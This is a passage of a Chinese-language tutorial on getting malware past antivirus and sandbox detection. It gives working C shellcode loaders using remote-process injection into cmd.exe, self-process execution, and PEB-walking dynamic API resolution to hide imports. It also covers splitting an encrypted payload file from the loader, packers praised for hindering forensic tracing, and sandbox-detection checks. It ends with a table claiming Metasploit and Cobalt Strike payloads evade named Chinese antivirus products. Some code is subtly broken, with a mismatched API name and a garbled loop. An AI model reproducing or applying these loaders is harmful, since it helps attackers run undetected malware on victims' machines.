        (LPSTR)"C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        true,
        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,//有扩展启动信息的结构体
        NULL,
        NULL,
        reinterpret_cast(&si),
        &pi);
    HANDLE notepadHandle = pi.hProcess;
    LPVOID remoteBuffer = VirtualAllocEx(notepadHandle, NULL, sizeof raw_buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(notepadHandle, remoteBuffer, raw_buf, sizeof raw_buf, NULL);
    HANDLE remoteThread = CreateRemoteThread(notepadHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (WaitForSingleObject(remoteThread, INFINITE) == WAIT_FAILED) {
        return;
    }
    if (ResumeThread(pi.hThread) == -1) {
        return;
    }
}
```
###### # VirtualAllocEx加载器-2
```C
void thr34d_h1j4ck1ng_2() {
    HANDLE p = NULL;
    LPVOID lpvAddr = VirtualAllocEx(GetCurrentProcess(), 0, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(lpvAddr, raw_buf, sizeof(raw_buf));
    DWORD pa = 0x01;
    VirtualProtect(lpvAddr, sizeof(raw_buf), 0x10, &pa);
    if (lpvAddr != NULL) {
        HANDLE s;
        s = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpvAddr, raw_buf, 0, 0);
        WaitForSingleObject(s, INFINITE);
    }
}
```
##### 1.2.4 动态函数寻址加载器
不论PE文件还是ELF文件都有导入表的说法，导入表内的内容与程序内使用的各种外部API函数息息相关。因而，不少杀毒软件也通过分析导入表来判断程序是否存在潜在的恶意特征。也介于这样原因，演化一种更高级的写法，能够降低导入表内出现的函数。
###### # 动态函数寻址加载器-1
```c
void cr34te_thr34d_dynamic_1() {
    //#include 
#include 
    LPVOID lpvAddr = (LPVOID)malloc(1024);
    memset(lpvAddr, '\x00', 1024);
    memcpy(lpvAddr, raw_buf, sizeof(raw_buf));
    DWORD pa = 0x01;
	LPVOID mVirtualProtect = GetProcAddress(LoadLibraryA("kernel32.dll"), "VirtualAlloc");
    mVirtualProtect(lpvAddr, sizeof(raw_buf), PAGE_EXECUTE_READWRITE, &pa);//PAGE_EXECUTE
    if (lpvAddr != NULL) {
        HANDLE s;
        s = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpvAddr, raw_buf, 0, 0);
        WaitForSingleObject(s, INFINITE);
    }
}
```
###### # 动态函数寻址加载器-2
不少加壳软件中大量用到了本技术，这种技术可以彻底脱离对外部API函数的导入需求，完全通过内部寻址实现。
```C
__declspec(naked) PDWORD GerKernelBase()
{
	__asm
	{
		mov eax, fs: [0x30] ;
		mov eax, [eax + 0x0c];
		mov eax, [eax + 0x14];
		mov eax, [eax];
		mov eax, [eax];
		mov eax, [eax + 0x10];
		ret
	}
}
DWORD GetFunAddr(DWORD* DllBase, char* FunName)
{
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)DllBase;
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos->e_lfanew + (DWORD)pDos);
	PIMAGE_OPTIONAL_HEADER pOt = (PIMAGE_OPTIONAL_HEADER)&pNt->OptionalHeader;
	PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pOt->DataDirectory[0].VirtualAddress + (DWORD)DllBase);
	PDWORD pNameAddr = (PDWORD)(pExport->AddressOfNames + (DWORD)DllBase);
	PWORD pNameOrdAddr = (PWORD)(pExport->AddressOfNameOrdinals + (DWORD)DllBase);
	PDWORD pFunAddr = (PDWORD)(pExport->AddressOfFunctions + (DWORD)DllBase);
	for (int i = 0; i NumberOfNames; i++)
	{
		char* Name = (char*)(pNameAddr[i] + (DWORD)DllBase);
		if (!strcmp(Name, FunName))
		{
			WORD NameOrdinal = pNameOrdAddr[i];
			return pFunAddr[NameOrdinal] + (DWORD)DllBase;
		}
	}
}
/*获取指定函数地址*/
FARPROC GetApi(char* LibraryName, char* FuncName)
{
	PDWORD KernerBase = GerKernelBase();
	M_GetProcAddress MyGetProcess = (M_GetProcAddress)GetFunAddr(KernerBase, "GetProcAddress");
	M_LoadLibraryA MyLoadLibraryA = (M_LoadLibraryA)GetFunAddr(KernerBase, "LoadLibraryA");
	return MyGetProcess(MyLoadLibraryA(LibraryName), FuncName);
}
void cr34te_thr34d_dynamic_2() {
    //#include 
#include 
    LPVOID lpvAddr = (LPVOID)malloc(1024);
    memset(lpvAddr, '\x00', 1024);
    memcpy(lpvAddr, raw_buf, sizeof(raw_buf));
    DWORD pa = 0x01;
	LPVOID mVirtualProtect = (LPVOID)GetApi("kernel32.dll", "VirtualProtect");
    mVirtualProtect(lpvAddr, sizeof(raw_buf), PAGE_EXECUTE_READWRITE, &pa);//PAGE_EXECUTE
    if (lpvAddr != NULL) {
        HANDLE s;
        s = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpvAddr, raw_buf, 0, 0);
        WaitForSingleObject(s, INFINITE);
    }
}
```
#### 1.3 分离免杀
截止目前，分离免杀被认为是一种较为先进且免杀效果较好的一种免杀方案。分离免杀是一种思想，将可替换的具有恶意特征的一部分代码从程序中分离出来。这样当杀毒软件单独查杀时就无法检测到文件中的特征了。
其基本结构如下：
```cmd
    FILE* fp = fopen("enc.txt", "rb");
......
    while ((ch = fgetc(fp)) != EOF)
    {
        ......
        raw_buf[i] = (unsigned char)ch;
        i++;
    }
......
	d3obfu3c4t0r(raw_buf, i+1);
    cr34te_thr34d_3(raw_buf);
```
#### 1.4 加壳免杀
所谓加壳软件，就是重新写PE文件头信息，并将PE文件进行资源压缩和代码加密。加壳后的文件在运行时，先执行加壳软件进行PE文件的还原工作，有的加壳软件先将PE文件全部在内存中还原后，再运行被还原的文件，还有的是还原一部分，运行一部分。
https://blog.csdn.net/dohxxx/article/details/88786309
https://bbs.pediy.com/thread-206804.htm
https://bbs.pediy.com/thread-206873.htm
一个相对成熟的免杀程序，加密壳可以说是必须的。它有多方面好处：
1.通用性更广。通用于有无源码免杀。通用于staging与stageless。
2.极大增加了后期分析时的难度。影响后期反制溯源流程。
3.免杀失效后快速产生工具。
4.增加了伸手党窃取成果的难度。
#### 1.5 脏语句
在不少关键操作前后添加一些无意义的脏语句，从而影响编译后的程序结构，破坏可能存在的静态特征。
诸如：
1.空的IO类函数调用；
2.数值、字符串拷贝；
3.计算、循环
4.内联汇编写花指令
### 2 反行为检测
反行为检测在具体实现中使用了不少虚拟容器判断的技术。
最常见的技术思想是，只要发现当前程序处于沙箱中就不运行。除此之外还有一些较为冷门的方案，如程序在某些固定的时间才会执行恶意逻辑。
目前收集到以下技术，常被用于绕过沙箱行为检测：
| 描述         | API(C)                                      |
| ------------ | ------------------------------------------- |
| 鼠标坐标     | GetCursorPos                                |
| 开机时长     | GetTickCount                                |
| 检测内存大小 | GlobalMemoryStatusEx                        |
| 检测CPU核数  | ((SYSTEM_INFO)sysinfo).dwNumberOfProcessors |
| 鼠标点击事件 | ReadConsoleInput                            |
| 网络连通性   | -                                           |
| 判断文件名   | -                                           |
| 条件时间运行 | GetSystemTime && if                         |
| 重启才运行   | GetSystemTime && if                         |
### 3 免杀效果
| 描述            | 反行为                                 | 火绒(静态) | 火绒(运行时) | 360杀毒(静态) | 360杀毒(运行时) | 360卫士(静态) | 360卫士(运行时) | 腾讯管家(静态) | 腾讯管家(运行时) |
| --------------- | -------------------------------------- | ---------- | ------------ | ------------- | --------------- | ------------- | --------------- | -------------- | ---------------- |
| staging(msf)    | GetCursorPos                           | ×          | √            | ×             | ×               | ×             | ×               | ×              | ×                |
| staging(msf)    | GetCursorPos                           | ×          | ×            | ×             | ×               | ×             | ×               | ×              | ×                |
| 分离免杀(msf)   | GetCursorPos                           | ×          | √            | ×             | ×               | ×             | ×               | ×              | ×                |
| 分离免杀(msf)   | GetCursorPos                           | ×          | ×            | ×             | ×               | ×             | ×               | ×              | ×                |
| staging(cs3.14) | GetCursorPos                           | ×          | ×            | ×             | ×               | ×             | ×               | ×              | ×                |
| staging(cs4)    | GetCursorPos                           | ×          | ×            | ×             | ×               | ×             | ×               | ×              | ×                |